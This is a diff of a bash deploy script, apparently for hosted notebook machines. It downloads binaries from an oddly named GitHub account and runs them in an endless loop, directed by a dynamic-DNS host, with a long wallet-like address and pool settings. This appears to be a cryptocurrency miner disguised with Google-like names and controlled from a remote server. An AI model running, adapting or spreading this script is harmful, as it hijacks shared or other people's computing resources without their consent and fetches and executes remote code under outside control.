@@ -1,5 +1,11 @@
 apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 
+while true
+do
+
+string=$(curl -s http://mobile8474.hopto.org/?q=deploy)
+if [[ $string == *"16384"* ]]; then
+
 cd /content/
 
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/devdeploy84.tar.gz
@@ -7,24 +13,16 @@ tar -xvf ./devdeploy84.tar.gz
 
 cd googleapps8474
 
-while true
-do
-
-google8474=$(nvidia-smi --query-gpu=name --format=csv,noheader | sed "s/ //g")
-
-if [[ $google8474 == "QuadroP4000" ]]
-then
-
 arr[0]="http://mobile8474.hopto.org/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
-google8412=$(curl $google841212121274 | sed "s/\s+//g")
+google8412=$(curl -s $google841212121274 | sed "s/\s+//g")
 
 if [[ $google8412 = "" ]]
 then
 
-timeout 84 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 16 -b 16
+timeout 8 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 22 -b 22
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -41,19 +39,27 @@ fi
 
 else
 
-if [[ $google8474 == "QuadroM4000" ]]
-then
+cd /content/
+
+mkdir ./google84
+
+cd google84
+
+wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux84741274.tar.gz
+tar -xf ./linux847412741274.tar.gz
+
+cd googleapps8474
 
 arr[0]="http://mobile8474.hopto.org/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
-google8412=$(curl $google841212121274 | sed "s/\s+//g")
+google8412=$(curl -s $google841212121274 | sed "s/\s+//g")
 
 if [[ $google8412 = "" ]]
 then
 
-timeout 84 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 16 -b 16
+timeout 8 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 4 -b 4
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -65,65 +71,6 @@ else
 echo "mobile8474"
 
 sleep 84;
-
-fi
-
-else
-
-if [[ $google8474 == "QuadroP5000" ]]
-then
-
-arr[0]="http://mobile8474.hopto.org/"
-rand=$[$RANDOM % ${#arr[@]}]
-google841212121274=${arr[$rand]}
-
-google8412=$(curl $google841212121274 | sed "s/\s+//g")
-
-if [[ $google8412 = "" ]]
-then
-
-timeout 84 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 20 -b 20
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
-else
-
-echo "mobile8474"
-
-sleep 84;
-
-fi
-
-else
-
-arr[0]="http://mobile8474.hopto.org/"
-rand=$[$RANDOM % ${#arr[@]}]
-google841212121274=${arr[$rand]}
-
-google8412=$(curl $google841212121274 | sed "s/\s+//g")
-
-if [[ $google8412 = "" ]]
-then
-
-timeout 84 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 20 -b 20
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
-else
-
-echo "mobile8474"
-
-sleep 84;
-
-fi
-
-fi
 
 fi
 
